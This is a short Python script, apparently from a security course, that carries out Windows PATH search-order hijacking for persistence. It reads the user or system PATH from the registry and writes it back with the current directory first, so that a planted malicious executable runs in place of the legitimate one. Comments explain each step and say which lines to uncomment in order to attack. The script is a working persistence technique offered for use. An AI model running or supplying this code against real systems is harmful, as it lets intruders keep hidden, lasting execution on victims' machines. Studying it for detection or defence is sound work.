# This script takes advantage of Windows PATH to achieve persistence on a target system.
# PATH is a hierarchical list of folders that Windows looks through so find specified executables. 
# The first instance of a the specified file is executed, and Windows stops looking through the PATH list.
# So an attacker can insert a malicious file in the PATH early on so Windows never reaches the legitimate executable.
# This is called "Search Order Hijacking."
# To note, there the Registry has a PATH per user, and a system-level PATH.

import os, winreg

def readPathValue(reghive,regpath):
    reg = winreg.ConnectRegistry(None,reghive)
    key = winreg.OpenKey(reg,regpath,access=winreg.KEY_READ)
    # See 5.1 for explanation.
    index = 0
    while True:
        val = winreg.EnumValue(key,index)
        if val[0] == "Path":
            return val[1]
            # This while loop searches through the entire Registry until it finds PATH, and returns the PATH list.
        index += 1

def editPathValue(reghive,regpath,targetdir):
    path = readPathValue(reghive,regpath)
    # This function uses the previous function to first access the existing PATH.
    newpath = targetdir + ";" + path
    # PATH values are ";" separated. So the line above puts the malicious folder at the front of PATH.
    reg = winreg.ConnectRegistry(None,reghive)
    key = winreg.OpenKey(reg,regpath,access=winreg.KEY_SET_VALUE)
    winreg.SetValueEx(key,"Path",0,winreg.REG_EXPAND_SZ,newpath)
    # These three lines access the Registry again, and write the new PATH. "REG_EXPAND_SZ" is PATH's "type" in the Registry.

targetdir = os.getcwd()
# reghive = winreg.HKEY_CURRENT_USER
# regpath = "Environment"
            # Replace this line with wherever you might have your malicious content stored.
# editPathValue(reghive,regpath,targetdir)
# Uncomment this block to modify User PATH.

# reghive = winreg.HKEY_LOCAL_MACHINE
# regpath = "SYSTEM\CurrentControlSet\Control\Session Manager\Environment"
# editPathValue(reghive,regpath,targetdir)
# Uncomment this block to modify System PATH. This will only work with Admin permissions.
